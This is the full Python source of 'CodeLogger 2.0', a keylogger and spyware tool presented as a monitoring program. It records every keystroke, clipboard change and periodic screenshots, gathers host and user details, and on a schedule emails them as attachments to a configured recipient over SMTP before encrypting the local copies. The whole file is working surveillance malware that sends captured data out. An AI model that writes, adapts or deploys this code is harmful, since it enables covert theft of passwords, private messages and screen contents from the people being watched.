#!/usr/bin/env python3
import os
import sys
import time
import platform
import json
import socket
import uuid
import logging
import threading
import base64
import smtplib
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List

import psutil
import schedule
import pyautogui
import pyperclip
from pynput.keyboard import Key, Listener, KeyCode

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

# ============================
# ASCII Banner Function
# ============================
def print_banner() -> None:
    banner = r"""
   _____          _      _                            
  / ____|        | |    | |                           
 | |     ___   __| | ___| |     ___   __ _  __ _  ___ _ __ 
 | |    / _ \ / _` |/ _ \ |    / _ \ / _` |/ _` |/ _ \ '__|
 | |___| (_) | (_| |  __/ |___| (_) | (_| | (_| |  __/ |   
  \_____\___/ \__,_|\___|______\___/ \__, |\__, |\___|_|   
                                       __/ | __/ |          
                                      |___/ |___/        v2.0
    """
    # Clear terminal (cross-platform)
    if platform.system() == "Windows":
        os.system('cls')
        os.system('color 0A')
    else:
        os.system('clear')
    
    print(banner)
    print("=" * 60)


# ============================
# Logger Class
# ============================
class Logger:
    """Simple logger using Python's logging module."""
    
    def __init__(self, log_file: str = None, level: int = logging.INFO) -> None:
        # Ensure output directory exists
        output_dir = "output"
        os.makedirs(output_dir, exist_ok=True)
        
        if log_file is None:
            log_file = os.path.join(output_dir, "codelogger.log")
            
        self.logger = logging.getLogger("CodeLogger")
        self.logger.setLevel(level)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

        fh = logging.FileHandler(log_file)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

        sh = logging.StreamHandler()
        sh.setFormatter(formatter)
        self.logger.addHandler(sh)

    def info(self, message: str) -> None:
        self.logger.info(message)

    def error(self, message: str) -> None:
        self.logger.error(message)

    def debug(self, message: str) -> None:
        self.logger.debug(message)


# ============================
# Config Manager Class
# ============================
class ConfigManager:
    """Handles configuration loading and saving."""
    
    def __init__(self, config_file: str = "config.json") -> None:
        # Ensure output directory exists
        self.output_dir = "output"
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.config_file = config_file
        self.config = {
            "output_dir": self.output_dir,
            "keylog_file": f"{self.output_dir}/key.txt",
            "screenshot_dir": f"{self.output_dir}/screenshots",
            "clipboard_file": f"{self.output_dir}/clipboard_history.txt",
            "encryption": {
                "enabled": True,
                "password": "default_password",
                "salt": "default_salt"
            },
            "email": {
                "enabled": True,
                "server": "smtp.gmail.com",
                "port": 587,
                "user": "example@gmail.com",
                "password": "password",
                "recipient": "example@gmail.com"
            },
            "features": {
                "keylogging": True,
                "screenshots": True,
                "clipboard_monitoring": True,
                "system_info": True
            },
            "schedule": {
                "interval_minutes": 30,
                "keystroke_threshold": 10
            }
        }
        self.load_config()
    
    def load_config(self) -> None:
        """Load config settings from JSON file if exists."""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r") as f:
                    loaded = json.load(f)
                    self.config.update(loaded)
            except Exception as e:
                print(f"Error loading config: {e}")

    def save_config(self) -> None:
        """Save current config settings to JSON file."""
        try:
            with open(self.config_file, "w") as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            print(f"Error saving config: {e}")
    
    def get(self, key: str, default: Any = None) -> Any:
        """Return configuration setting given a dotted key."""
        keys = key.split('.')
        value = self.config
        try:
            for k in keys:
                value = value[k]
            return value
        except KeyError:
            return default


# ============================
# Encryptor Class
# ============================
class Encryptor:
    """Handles file encryption and decryption."""
    
    def __init__(self, config: ConfigManager) -> None:
        self.config = config
        self.fernet = self._get_fernet()

    def _get_fernet(self) -> Fernet:
        password = self.config.get("encryption.password").encode()
        salt = self.config.get("encryption.salt").encode()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)

    def encrypt_file(self, file_path: str) -> bool:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            enc_data = self.fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(enc_data)
            return True
        except Exception as e:
            print(f"Encryption error: {e}")
            return False

    def decrypt_file(self, file_path: str) -> bool:
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            dec_data = self.fernet.decrypt(data)
            with open(file_path, "wb") as f:
                f.write(dec_data)
            return True
        except Exception as e:
            print(f"Decryption error: {e}")
            return False


# ============================
# Email Reporter Class
# ============================
class EmailReporter:
    """Sends email reports with attachments."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
    
    def send_report(self, subject: str, body: str, attachments: List[str] = []) -> bool:
        if not self.config.get("email.enabled", False):
            self.logger.info("Email reporting is disabled in config.")
            return False
        
        try:
            msg = MIMEMultipart()
            msg["Subject"] = subject
            msg["From"] = self.config.get("email.user")
            msg["To"] = self.config.get("email.recipient")
            msg.attach(MIMEText(body, "plain"))
            
            for attachment in attachments:
                if os.path.exists(attachment):
                    part = MIMEBase("application", "octet-stream")
                    with open(attachment, "rb") as f:
                        part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        "Content-Disposition", 
                        f"attachment; filename={os.path.basename(attachment)}"
                    )
                    msg.attach(part)
            
            server = smtplib.SMTP(self.config.get("email.server"), self.config.get("email.port"))
            server.starttls()
            server.login(self.config.get("email.user"), self.config.get("email.password"))
            server.sendmail(self.config.get("email.user"), self.config.get("email.recipient"), msg.as_string())
            server.quit()
            
            self.logger.info("Email sent successfully.")
            return True
        except Exception as e:
            self.logger.error(f"Failed to send email: {e}")
            return False


# ============================
# System Monitor Class
# ============================
class SystemMonitor:
    """Gathers and saves basic system information."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.logger = logger
        self.config = config
        self.info_dir = os.path.join(self.config.get("output_dir", "output"), "system_info")
        os.makedirs(self.info_dir, exist_ok=True)
    
    def get_system_info(self) -> Dict[str, Any]:
        info = {
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "architecture": platform.architecture(),
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                                      for i in range(0, 48, 8)][::-1]),
            "username": os.getlogin(),
            "cpu_count": psutil.cpu_count(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk": psutil.disk_usage('/')._asdict(),
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        }
        return info

    def save_system_info(self) -> str:
        info = self.get_system_info()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = os.path.join(self.info_dir, f"system_info_{timestamp}.json")
        try:
            with open(file_path, "w") as f:
                json.dump(info, f, indent=4)
            self.logger.info(f"System info saved to {file_path}")
            return file_path
        except Exception as e:
            self.logger.error(f"Error saving system info: {e}")
            return ""


# ============================
# Screenshot Capture Class
# ============================
class ScreenshotCapture:
    """Captures screenshots and saves them."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
        self.screenshot_dir = self.config.get("screenshot_dir", os.path.join(self.config.get("output_dir", "output"), "screenshots"))
        os.makedirs(self.screenshot_dir, exist_ok=True)
    
    def capture(self) -> str:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = os.path.join(self.screenshot_dir, f"screenshot_{timestamp}.png")
        try:
            image = pyautogui.screenshot()
            image.save(file_path)
            self.logger.info(f"Screenshot saved to {file_path}")
            return file_path
        except Exception as e:
            self.logger.error(f"Screenshot error: {e}")
            return ""


# ============================
# Clipboard Monitor Class
# ============================
class ClipboardMonitor:
    """Monitors and logs clipboard content changes."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
        self.clipboard_file = self.config.get("clipboard_file", os.path.join(self.config.get("output_dir", "output"), "clipboard_history.txt"))
        # Ensure directory exists
        os.makedirs(os.path.dirname(self.clipboard_file), exist_ok=True)
        self.monitoring = False
        self.last_content = ""
    
    def start(self) -> None:
        self.monitoring = True
        thread = threading.Thread(target=self._monitor)
        thread.daemon = True
        thread.start()
        self.logger.info("Clipboard monitoring started.")
    
    def _monitor(self) -> None:
        while self.monitoring:
            try:
                content = pyperclip.paste()
                if content != self.last_content:
                    self.last_content = content
                    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                    with open(self.clipboard_file, "a", encoding="utf-8") as f:
                        f.write(f"\n{timestamp} {content}\n")
            except Exception as e:
                self.logger.error(f"Clipboard error: {e}")
            time.sleep(1)


# ============================
# KeyLogger Class
# ============================
class KeyLogger:
    """Main keylogging functionality."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
        self.keys: List[str] = []
        self.count = 0
        output_dir = self.config.get("output_dir", "output")
        self.filename = self.config.get("keylog_file", os.path.join(output_dir, "key.txt"))
        # Ensure we have an absolute path
        if not os.path.isabs(self.filename):
            self.filename = os.path.abspath(self.filename)
        self.threshold = self.config.get("schedule.keystroke_threshold", 10)
        # Ensure directory exists
        os.makedirs(os.path.dirname(self.filename), exist_ok=True)
        self._ensure_unique_filename()
    
    def _ensure_unique_filename(self) -> None:
        base = Path(self.filename)
        original_dir = base.parent
        while base.exists():
            self.count += 1
            # Create new filename in the same directory as the original
            self.filename = os.path.join(original_dir, f"{base.stem}_{self.count}{base.suffix}")
            base = Path(self.filename)
    
    def write_keys(self, key: str) -> None:
        self.keys.append(key)
        if len(self.keys) >= self.threshold:
            with open(self.filename, "a") as f:
                for k in self.keys:
                    if "space" in k.lower():
                        f.write("\n")
                    elif "key" not in k.lower():
                        f.write(k)
                self.keys = []
    
    def on_press(self, key) -> None:
        try:
            self.write_keys(str(key).replace("'", ""))
        except Exception as e:
            self.logger.error(f"Error writing key: {e}")
    
    def on_release(self, key) -> bool:
        # Stop keylogger if Ctrl+Z or Command+Z (macOS) is pressed
        if hasattr(key, "vk"):
            if key == KeyCode.from_char("z") and (hasattr(key, "ctrl") and key.ctrl):
                self.logger.info("Stop key combination pressed. Exiting keylogger.")
                return False
            if platform.system() == "Darwin":
                # For macOS, check for Command+Z (using Key.cmd)
                if key == KeyCode.from_char("z") and hasattr(key, "cmd") and key.cmd:
                    self.logger.info("Stop key combination (Cmd+Z) pressed. Exiting keylogger.")
                    return False
        return True
    
    def start(self) -> None:
        self.logger.info("Keylogger started.")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


# ============================
# Configuration Wizard Class
# ============================
class ConfigurationWizard:
    """Interactive wizard to guide users through configuration setup."""
    
    def __init__(self, config: ConfigManager) -> None:
        self.config = config
    
    def run_wizard(self) -> None:
        """Run the interactive configuration wizard."""
        print_banner()
        print("\nWelcome to CodeLogger Configuration Wizard")
        print("=" * 60)
        
        self._configure_general()
        self._configure_email()
        self._configure_encryption()
        self._configure_features()
        self._configure_schedule()
        
        self.config.save_config()
        print("\nConfiguration saved successfully!")
        print("=" * 60)
        input("Press Enter to continue...")
    
    def _configure_general(self) -> None:
        print("\n[General Configuration]")
        output_dir = input(f"Output directory [default: {self.config.get('output_dir')}]: ")
        if output_dir:
            self.config.config["output_dir"] = output_dir
            # Update dependent paths
            self.config.config["keylog_file"] = f"{output_dir}/key.txt"
            self.config.config["screenshot_dir"] = f"{output_dir}/screenshots"
            self.config.config["clipboard_file"] = f"{output_dir}/clipboard_history.txt"
    
    def _configure_email(self) -> None:
        print("\n[Email Configuration]")
        print("Configure email settings for reports (leave blank to keep current values)")
        
        enable = input(f"Enable email reporting (yes/no) [default: {'yes' if self.config.get('email.enabled') else 'no'}]: ")
        if enable.lower() in ["yes", "y", "true"]:
            self.config.config["email"]["enabled"] = True
            
            server = input(f"SMTP server [default: {self.config.get('email.server')}]: ")
            if server:
                self.config.config["email"]["server"] = server
            
            port = input(f"SMTP port [default: {self.config.get('email.port')}]: ")
            if port:
                self.config.config["email"]["port"] = int(port)
            
            user = input(f"Email username [default: {self.config.get('email.user')}]: ")
            if user:
                self.config.config["email"]["user"] = user
            
            password = input(f"Email password [leave blank to keep current]: ")
            if password:
                self.config.config["email"]["password"] = password
            
            recipient = input(f"Recipient email [default: {self.config.get('email.recipient')}]: ")
            if recipient:
                self.config.config["email"]["recipient"] = recipient
        elif enable.lower() in ["no", "n", "false"]:
            self.config.config["email"]["enabled"] = False
    
    def _configure_encryption(self) -> None:
        print("\n[Encryption Configuration]")
        
        enable = input(f"Enable encryption (yes/no) [default: {'yes' if self.config.get('encryption.enabled') else 'no'}]: ")
        if enable.lower() in ["yes", "y", "true"]:
            self.config.config["encryption"]["enabled"] = True
            
            password = input(f"Encryption password [leave blank to keep current]: ")
            if password:
                self.config.config["encryption"]["password"] = password
            
            salt = input(f"Encryption salt [leave blank to keep current]: ")
            if salt:
                self.config.config["encryption"]["salt"] = salt
        elif enable.lower() in ["no", "n", "false"]:
            self.config.config["encryption"]["enabled"] = False
    
    def _configure_features(self) -> None:
        print("\n[Features Configuration]")
        
        keylogging = input(f"Enable keylogging (yes/no) [default: {'yes' if self.config.get('features.keylogging') else 'no'}]: ")
        if keylogging.lower() in ["yes", "y", "true"]:
            self.config.config["features"]["keylogging"] = True
        elif keylogging.lower() in ["no", "n", "false"]:
            self.config.config["features"]["keylogging"] = False
        
        screenshots = input(f"Enable screenshots (yes/no) [default: {'yes' if self.config.get('features.screenshots') else 'no'}]: ")
        if screenshots.lower() in ["yes", "y", "true"]:
            self.config.config["features"]["screenshots"] = True
        elif screenshots.lower() in ["no", "n", "false"]:
            self.config.config["features"]["screenshots"] = False
        
        clipboard = input(f"Enable clipboard monitoring (yes/no) [default: {'yes' if self.config.get('features.clipboard_monitoring') else 'no'}]: ")
        if clipboard.lower() in ["yes", "y", "true"]:
            self.config.config["features"]["clipboard_monitoring"] = True
        elif clipboard.lower() in ["no", "n", "false"]:
            self.config.config["features"]["clipboard_monitoring"] = False
        
        sysinfo = input(f"Enable system info collection (yes/no) [default: {'yes' if self.config.get('features.system_info') else 'no'}]: ")
        if sysinfo.lower() in ["yes", "y", "true"]:
            self.config.config["features"]["system_info"] = True
        elif sysinfo.lower() in ["no", "n", "false"]:
            self.config.config["features"]["system_info"] = False
    
    def _configure_schedule(self) -> None:
        print("\n[Schedule Configuration]")
        
        interval = input(f"Report interval in minutes [default: {self.config.get('schedule.interval_minutes')}]: ")
        if interval:
            self.config.config["schedule"]["interval_minutes"] = int(interval)
        
        threshold = input(f"Keystroke threshold before saving [default: {self.config.get('schedule.keystroke_threshold')}]: ")
        if threshold:
            self.config.config["schedule"]["keystroke_threshold"] = int(threshold)


# ============================
# Progress Bar and UI Utilities
# ============================
class ProgressBar:
    """A simple progress bar for console output."""
    
    def __init__(self, total: int, prefix: str = "", suffix: str = "", length: int = 50, fill: str = "█") -> None:
        self.total = total
        self.prefix = prefix
        self.suffix = suffix
        self.length = length
        self.fill = fill
        self.iteration = 0
    
    def update(self, iteration: int = None) -> None:
        """Update the progress bar."""
        if iteration is not None:
            self.iteration = iteration
        else:
            self.iteration += 1
        
        percent = ("{0:.1f}").format(100 * (self.iteration / float(self.total)))
        filled_length = int(self.length * self.iteration // self.total)
        bar = self.fill * filled_length + "-" * (self.length - filled_length)
        print(f"\r{self.prefix} |{bar}| {percent}% {self.suffix}", end="\r")
        
        # Print new line on completion
        if self.iteration == self.total:
            print()


# ============================
# Enhanced Report Generator
# ============================
class ReportGenerator:
    """Generates detailed HTML and text reports."""
    
    def __init__(self, config: ConfigManager, logger: Logger) -> None:
        self.config = config
        self.logger = logger
        self.output_dir = self.config.get("output_dir", "output")
        self.report_dir = os.path.join(self.output_dir, "reports")
        os.makedirs(self.report_dir, exist_ok=True)
    
    def generate_html_report(self, data: Dict[str, Any]) -> str:
        """Generate an HTML report with the provided data."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join(self.report_dir, f"report_{timestamp}.html")
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>CodeLogger Report - {timestamp}</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; color: #333; }}
                .container {{ max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                h1, h2, h3 {{ color: #2c3e50; }}
                h1 {{ border-bottom: 2px solid #3498db; padding-bottom: 10px; }}
                .section {{ margin: 20px 0; border: 1px solid #eee; padding: 15px; border-radius: 5px; }}
                .section h3 {{ margin-top: 0; color: #3498db; }}
                table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
                th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }}
                th {{ background-color: #f2f2f2; }}
                .footer {{ margin-top: 30px; text-align: center; font-size: 0.8em; color: #7f8c8d; }}
                pre {{ background-color: #f8f8f8; padding: 10px; border-radius: 3px; overflow-x: auto; }}
                .status-ok {{ color: #27ae60; }}
                .status-warning {{ color: #f39c12; }}
                .status-error {{ color: #e74c3c; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>CodeLogger Report</h1>
                <p>Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                
                <!-- System Information -->
                <div class="section">
                    <h3>System Information</h3>
                    <table>
                        <tr><th>Hostname</th><td>{data.get('system_info', {}).get('hostname', 'N/A')}</td></tr>
                        <tr><th>IP Address</th><td>{data.get('system_info', {}).get('ip_address', 'N/A')}</td></tr>
                        <tr><th>Platform</th><td>{data.get('system_info', {}).get('platform', 'N/A')}</td></tr>
                        <tr><th>Username</th><td>{data.get('system_info', {}).get('username', 'N/A')}</td></tr>
                        <tr><th>Boot Time</th><td>{data.get('system_info', {}).get('boot_time', 'N/A')}</td></tr>
                    </table>
                </div>
                
                <!-- Screenshot List -->
                <div class="section">
                    <h3>Screenshots</h3>
                    <p>Total Screenshots: {len(data.get('screenshots', []))}</p>
                    <ul>
                        {"".join([f'<li>{os.path.basename(screenshot)}</li>' for screenshot in data.get('screenshots', [])])}
                    </ul>
                </div>
                
                <!-- Recent Keystrokes -->
                <div class="section">
                    <h3>Recent Keystrokes</h3>
                    <pre>{data.get('recent_keystrokes', 'No keystrokes recorded')}</pre>
                </div>
                
                <!-- Recent Clipboard -->
                <div class="section">
                    <h3>Recent Clipboard Content</h3>
                    <pre>{data.get('recent_clipboard', 'No clipboard content recorded')}</pre>
                </div>
                
                <div class="footer">
                    <p>CodeLogger 2.0 - Advanced Monitoring Tool</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        try:
            with open(report_path, "w", encoding="utf-8") as f:
                f.write(html_content)
            self.logger.info(f"HTML report generated: {report_path}")
            return report_path
        except Exception as e:
            self.logger.error(f"Error generating HTML report: {e}")
            return ""
    
    def generate_text_report(self, data: Dict[str, Any]) -> str:
        """Generate a text report with the provided data."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join(self.report_dir, f"report_{timestamp}.txt")
        
        text_content = f"""
==============================================
           CodeLogger Report
==============================================
Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

------ System Information ------
Hostname: {data.get('system_info', {}).get('hostname', 'N/A')}
IP Address: {data.get('system_info', {}).get('ip_address', 'N/A')}
Platform: {data.get('system_info', {}).get('platform', 'N/A')}
Username: {data.get('system_info', {}).get('username', 'N/A')}
Boot Time: {data.get('system_info', {}).get('boot_time', 'N/A')}

------ Screenshots ------
Total Screenshots: {len(data.get('screenshots', []))}
{chr(10).join([f'- {os.path.basename(screenshot)}' for screenshot in data.get('screenshots', [])])}

------ Recent Keystrokes ------
{data.get('recent_keystrokes', 'No keystrokes recorded')}

------ Recent Clipboard Content ------
{data.get('recent_clipboard', 'No clipboard content recorded')}

==============================================
        CodeLogger 2.0 - Advanced Monitoring Tool
==============================================
"""
        
        try:
            with open(report_path, "w", encoding="utf-8") as f:
                f.write(text_content)
            self.logger.info(f"Text report generated: {report_path}")
            return report_path
        except Exception as e:
            self.logger.error(f"Error generating text report: {e}")
            return ""


# ============================
# Scheduler Functionality
# ============================
def scheduled_tasks(keylogger: KeyLogger,
                    screenshot: ScreenshotCapture,
                    system_monitor: SystemMonitor,
                    email_reporter: EmailReporter,
                    encryptor: Encryptor,
                    report_generator: ReportGenerator,
                    logger: Logger,
                    config: ConfigManager) -> None:
    """
    Gather scheduled data (system info, screenshots) and send email reports.
    """
    # Display progress
    print("\nRunning scheduled tasks...")
    progress = ProgressBar(5, prefix="Progress:", suffix="Complete", length=50)
    
    # Prepare data for report
    report_data = {}
    attachments: List[str] = []
    
    # Step 1: Collect keylog data
    progress.update(1)
    if os.path.exists(keylogger.filename):
        attachments.append(keylogger.filename)
        # Get recent keystrokes for report
        try:
            with open(keylogger.filename, "r", encoding="utf-8") as f:
                # Get last 50 lines max
                lines = f.readlines()[-50:]
                report_data["recent_keystrokes"] = "".join(lines)
        except Exception as e:
            logger.error(f"Error reading keylog file: {e}")
            report_data["recent_keystrokes"] = "Error reading keylog file"
    
    # Step 2: Take screenshots if enabled
    progress.update(2)
    report_data["screenshots"] = []
    if config.get("features.screenshots", True):
        screenshot_file = screenshot.capture()
        if screenshot_file:
            attachments.append(screenshot_file)
            report_data["screenshots"].append(screenshot_file)
    
    # Step 3: Collect system info if enabled
    progress.update(3)
    if config.get("features.system_info", True):
        system_info_file = system_monitor.save_system_info()
        if system_info_file:
            attachments.append(system_info_file)
            try:
                with open(system_info_file, "r") as f:
                    report_data["system_info"] = json.load(f)
            except Exception as e:
                logger.error(f"Error reading system info file: {e}")
                report_data["system_info"] = {}
    
    # Step 4: Get recent clipboard content
    progress.update(4)
    clipboard_file = config.get("clipboard_file")
    if os.path.exists(clipboard_file):
        try:
            with open(clipboard_file, "r", encoding="utf-8") as f:
                # Get last 10 clipboard entries max
                lines = f.readlines()[-30:]
                report_data["recent_clipboard"] = "".join(lines)
        except Exception as e:
            logger.error(f"Error reading clipboard file: {e}")
            report_data["recent_clipboard"] = "Error reading clipboard data"
    
    # Step 5: Generate reports and send email
    progress.update(5)
    html_report = report_generator.generate_html_report(report_data)
    text_report = report_generator.generate_text_report(report_data)
    
    if html_report:
        attachments.append(html_report)
    if text_report:
        attachments.append(text_report)
    
    subject = "CodeLogger Report"
    body = f"CodeLogger report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    body += f"Attached are the collected logs and reports.\n"
    body += f"For detailed information, see the HTML or text report attachments."
    
    email_reporter.send_report(subject, body, attachments)
    
    # Encrypt files if enabled
    if config.get("encryption.enabled", True):
        for file in attachments:
            if os.path.exists(file) and not file.endswith(('.png', '.jpg', '.jpeg')):
                encryptor.encrypt_file(file)
    
    print("\nScheduled tasks completed successfully!")


# ============================
# Command Line Interface
# ============================
def parse_arguments() -> dict:
    """Parse command line arguments."""
    import argparse
    
    parser = argparse.ArgumentParser(description="CodeLogger 2.0 - Advanced Monitoring Tool")
    parser.add_argument("--config", action="store_true", help="Run the configuration wizard")
    parser.add_argument("--decrypt", metavar="FILE", help="Decrypt a file encrypted by CodeLogger")
    parser.add_argument("--version", action="store_true", help="Show CodeLogger version information")
    parser.add_argument("--report-only", action="store_true", help="Generate a report without starting monitoring")
    parser.add_argument("--status", action="store_true", help="Show the status of CodeLogger services")
    
    return vars(parser.parse_args())


# ============================
# Main Application Structure
# ============================
def main() -> None:
    print_banner()
    
    # Parse command line arguments
    args = parse_arguments()
    
    # Show version information if requested
    if args.get("version"):
        print("CodeLogger 2.0 - Advanced Monitoring Tool")
        print("Copyright (c) 2025 - All Rights Reserved")
        print("License: MIT")
        sys.exit(0)
    
    # Initialize config first
    config = ConfigManager()
    
    # Check if this is the first run or if user wants to configure
    if not os.path.exists(config.config_file) or args.get("config"):
        wizard = ConfigurationWizard(config)
        wizard.run_wizard()
    
    logger = Logger()
    logger.info("Starting CodeLogger 2.0 ...")
    
    # Create instances of all components
    encryptor = Encryptor(config)
    email_reporter = EmailReporter(config, logger)
    system_monitor = SystemMonitor(config, logger)
    screenshot = ScreenshotCapture(config, logger)
    keylogger = KeyLogger(config, logger)
    clipboard_monitor = ClipboardMonitor(config, logger)
    report_generator = ReportGenerator(config, logger)
    
    # Decrypt a file if requested
    if args.get("decrypt"):
        file_path = args.get("decrypt")
        if os.path.exists(file_path):
            if encryptor.decrypt_file(file_path):
                print(f"File decrypted successfully: {file_path}")
            else:
                print(f"Error decrypting file: {file_path}")
        else:
            print(f"File not found: {file_path}")
        sys.exit(0)
    
    # Generate a report only if requested
    if args.get("report_only"):
        print("Generating report only...")
        scheduled_tasks(
            keylogger=keylogger, 
            screenshot=screenshot, 
            system_monitor=system_monitor,
            email_reporter=email_reporter, 
            encryptor=encryptor, 
            report_generator=report_generator,
            logger=logger, 
            config=config
        )
        print("Report generation complete.")
        sys.exit(0)
    
    # Show status if requested
    if args.get("status"):
        print("\n" + "=" * 60)
        print("CodeLogger 2.0 Status")
        print("=" * 60)
        print(f"✓ Configuration file: {'Exists' if os.path.exists(config.config_file) else 'Not found'}")
        print(f"✓ Output directory: {config.get('output_dir', 'output')} ({'Exists' if os.path.exists(config.get('output_dir', 'output')) else 'Not found'})")
        print(f"✓ Email configuration: {'Configured' if config.get('email.enabled') else 'Disabled'}")
        sys.exit(0)
    
    # Start clipboard monitoring if enabled
    if config.get("features.clipboard_monitoring", True):
        clipboard_monitor.start()
        logger.info("Clipboard monitoring started.")
    else:
        logger.info("Clipboard monitoring is disabled.")
    
    # Set up scheduled tasks
    interval = config.get("schedule.interval_minutes", 30)
    schedule.every(interval).minutes.do(
        scheduled_tasks, 
        keylogger=keylogger, 
        screenshot=screenshot, 
        system_monitor=system_monitor,
        email_reporter=email_reporter, 
        encryptor=encryptor, 
        report_generator=report_generator,
        logger=logger, 
        config=config
    )
    
    logger.info(f"Reporting scheduled every {interval} minutes.")
    
    # Start the keylogger in a separate thread
    if config.get("features.keylogging", True):
        keylogger_thread = threading.Thread(target=keylogger.start)
        keylogger_thread.daemon = True
        keylogger_thread.start()
        logger.info("Keylogger started.")
    else:
        logger.info("Keylogging is disabled.")
    
    # Print a summary of enabled features
    print("\n" + "=" * 60)
    print("CodeLogger 2.0 is running with the following configuration:")
    print(f"✓ Output directory: {config.get('output_dir', 'output')}")
    print(f"✓ Keylogging: {'Enabled' if config.get('features.keylogging', True) else 'Disabled'}")
    print(f"✓ Screenshots: {'Enabled' if config.get('features.screenshots', True) else 'Disabled'}")
    print(f"✓ Clipboard monitoring: {'Enabled' if config.get('features.clipboard_monitoring', True) else 'Disabled'}")
    print(f"✓ System info collection: {'Enabled' if config.get('features.system_info', True) else 'Disabled'}")
    print(f"✓ Email reporting: {'Enabled' if config.get('email.enabled', True) else 'Disabled'}")
    print(f"✓ Encryption: {'Enabled' if config.get('encryption.enabled', True) else 'Disabled'}")
    print(f"✓ Reporting interval: Every {interval} minutes")
    print("=" * 60)
    print("\nPress Ctrl+C to exit, or run with --config to reconfigure.")
    print("=" * 60)
    
    try:
        while True:
            schedule.run_pending()
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Exiting CodeLogger...")
        print("\nThank you for using CodeLogger 2.0!")
        sys.exit(0)

# Add the entry point to call main() when the script is executed directly
if __name__ == "__main__":
    main()